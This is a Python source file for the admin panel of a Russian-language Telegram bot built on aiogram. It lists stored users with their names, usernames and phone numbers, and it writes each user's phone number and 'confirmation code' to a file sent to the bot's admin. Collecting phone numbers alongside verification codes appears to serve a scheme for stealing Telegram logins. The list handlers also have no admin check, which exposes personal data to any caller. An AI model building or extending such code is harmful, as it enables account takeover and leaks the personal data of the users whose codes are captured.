import logging
import sqlite3
from math import ceil

from aiogram import Router, F
from aiogram.types import CallbackQuery, InlineKeyboardButton, FSInputFile
from aiogram.utils.keyboard import InlineKeyboardBuilder

from bot.database.db import DB_NAME
from bot.database.user.user import get_users, get_users_amdin_panel
from bot.start_bot import test_id, admin_id

router = Router()
PAGE_SIZE = 3


def create_user_data_file_admin_panel(user_id):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("SELECT name, username, phone, code FROM users WHERE user_id = ?", (user_id,))
    user_data = cursor.fetchone()
    conn.close()

    if not user_data:
        return None

    name, username, phone, code = user_data
    username = f"@{username}" if username else "Не указан"

    file_path = f"user_{user_id}.txt"
    with open(file_path, "w", encoding="utf-8") as file:
        file.write(f"👤 Имя: {name}\n")
        file.write(f"🔗 Username: {username}\n")
        file.write(f"📱 Номер телефона: {phone}\n")
        file.write(f"🔢 Код подтверждения: {code if code else '—'}\n")

    return file_path


def get_navigation_kb(users, page, total_pages):
    kb = InlineKeyboardBuilder()

    for user in users:
        user_id, name, username, phone = user
        username = f"@{username}" if username else "Не указан"

        kb.row(InlineKeyboardButton(text=f"📄 Скачать: {name}", callback_data=f"user_details:{user_id}"))

    nav_buttons = []
    if page > 1:
        nav_buttons.append(InlineKeyboardButton(text="⬅️ Назад", callback_data=f"prev_page:{page - 1}"))
    if page < total_pages:
        nav_buttons.append(InlineKeyboardButton(text="➡️ Вперёд", callback_data=f"next_page:{page + 1}"))

    if nav_buttons:
        kb.row(*nav_buttons)

    return kb.as_markup()


def format_users_page(page):
    users = get_users_amdin_panel()
    if not users:
        return None, 1

    total_pages = ceil(len(users) / PAGE_SIZE)
    page = max(1, min(page, total_pages))

    start_index = (page - 1) * PAGE_SIZE
    end_index = start_index + PAGE_SIZE
    users_on_page = users[start_index:end_index]

    return users_on_page, total_pages


@router.callback_query(lambda c: c.data == "view_users")
async def view_users(callback: CallbackQuery):
    users, total_pages = format_users_page(1)

    if not users:
        await callback.message.answer("📭 В базе нет пользователей.")
        return

    users_text = "\n\n".join([
        f"👤 <b>Имя:</b> {user[1]}\n"
        f"🔗 <b>Username:</b> @{user[2] if user[2] else 'Не указан'}\n"
        f"📱 <b>Телефон:</b> <code>{user[3]}</code>\n"
        f"🆔 <b>ID:</b> {user[0]}"
        for user in users
    ])

    await callback.message.delete()
    await callback.message.answer(
        f"📋 <b>Список пользователей (страница 1/{total_pages}):</b>\n\n"
        f"{users_text}\n\n"
        "🔽 Нажмите кнопку ниже, чтобы скачать полную информацию:",
        parse_mode="HTML",
        reply_markup=get_navigation_kb(users, 1, total_pages)
    )


@router.callback_query(lambda c: c.data.startswith("prev_page"))
async def prev_page(callback: CallbackQuery):
    page = int(callback.data.split(":")[1])
    users, total_pages = format_users_page(page)

    if not users:
        await callback.answer("📭 В базе нет пользователей.", show_alert=True)
        return

    users_text = "\n\n".join([
        f"👤 <b>Имя:</b> {user[1]}\n"
        f"🔗 <b>Username:</b> @{user[2] if user[2] else 'Не указан'}\n"
        f"📱 <b>Телефон:</b> <code>{user[3]}</code>\n"
        f"🆔 <b>ID:</b> {user[0]}"
        for user in users
    ])

    await callback.message.edit_text(
        f"📋 <b>Список пользователей (страница {page}/{total_pages}):</b>\n\n"
        f"{users_text}\n\n"
        "🔽 Нажмите кнопку ниже, чтобы скачать полную информацию:",
        parse_mode="HTML",
        reply_markup=get_navigation_kb(users, page, total_pages)
    )


@router.callback_query(lambda c: c.data.startswith("next_page"))
async def next_page(callback: CallbackQuery):
    page = int(callback.data.split(":")[1])
    users, total_pages = format_users_page(page)

    if not users:
        await callback.answer("📭 В базе нет пользователей.", show_alert=True)
        return

    users_text = "\n\n".join([
        f"👤 <b>Имя:</b> {user[1]}\n"
        f"🔗 <b>Username:</b> @{user[2] if user[2] else 'Не указан'}\n"
        f"📱 <b>Телефон:</b> <code>{user[3]}</code>\n"
        f"🆔 <b>ID:</b> {user[0]}"
        for user in users
    ])

    await callback.message.edit_text(
        f"📋 <b>Список пользователей (страница {page}/{total_pages}):</b>\n\n"
        f"{users_text}\n\n"
        "🔽 Нажмите кнопку ниже, чтобы скачать полную информацию:",
        parse_mode="HTML",
        reply_markup=get_navigation_kb(users, page, total_pages)
    )


@router.callback_query(lambda c: c.data.startswith("user_details:"))
async def user_details(callback: CallbackQuery):
    user_id = int(callback.data.split(":")[1])
    file_path = create_user_data_file_admin_panel(user_id)

    if file_path:
        await callback.bot.send_document(
            admin_id,
            FSInputFile(file_path),
            caption=f"📂 Данные пользователя {user_id}."
        )
        await callback.answer("📄 Файл с данными отправлен админу!")
    else:
        await callback.answer("❌ Ошибка! Файл не найден.", show_alert=True)
